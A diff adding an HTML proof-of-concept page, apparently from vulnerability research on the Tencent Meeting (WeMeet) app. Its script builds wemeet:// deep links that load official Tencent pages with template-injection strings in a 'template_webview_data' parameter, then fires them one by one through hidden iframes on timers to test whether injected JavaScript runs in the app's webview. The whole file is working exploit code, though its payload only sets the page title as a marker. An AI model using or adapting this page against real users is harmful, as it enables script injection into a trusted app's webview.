@@ -1,0 +1,32 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P24</h1>
+<script>
+document.title='P24L-START';
+var inj1='1);document.title="TPLINJ1";(';
+var inj2='");document.title="TPLINJ2";//';
+var inj3='{"poc":"p24"}';
+var official=[
+  'https://meeting.tencent.com/v2/service-worker/webview-startup',
+  'https://meeting.tencent.com/v2/webview/jump-confirmation?is_template=1',
+  'https://meeting.tencent.com/'
+];
+var schemes=[];
+official.forEach(function(u){
+  schemes.push('wemeet://page/webview?url='+encodeURIComponent(u)+'&template_webview_data='+encodeURIComponent(inj1));
+});
+schemes.push('wemeet://page/webview?url='+encodeURIComponent(official[0])+'&template_webview_data='+encodeURIComponent(inj2));
+schemes.push('wemeet://page/question_answer?url='+encodeURIComponent(official[1])+'&template_webview_data='+encodeURIComponent(inj1));
+var i=0;
+function fire(){
+  if(i>=schemes.length){ document.title='P24L-DONE-IFRAMES'; return; }
+  var s=schemes[i++];
+  document.title='P24L-IFRAME-'+i;
+  var f=document.createElement('iframe');
+  f.src=s;
+  document.body.appendChild(f);
+  setTimeout(fire, 2800);
+}
+setTimeout(fire, 800);
+</script>
+</body></html>
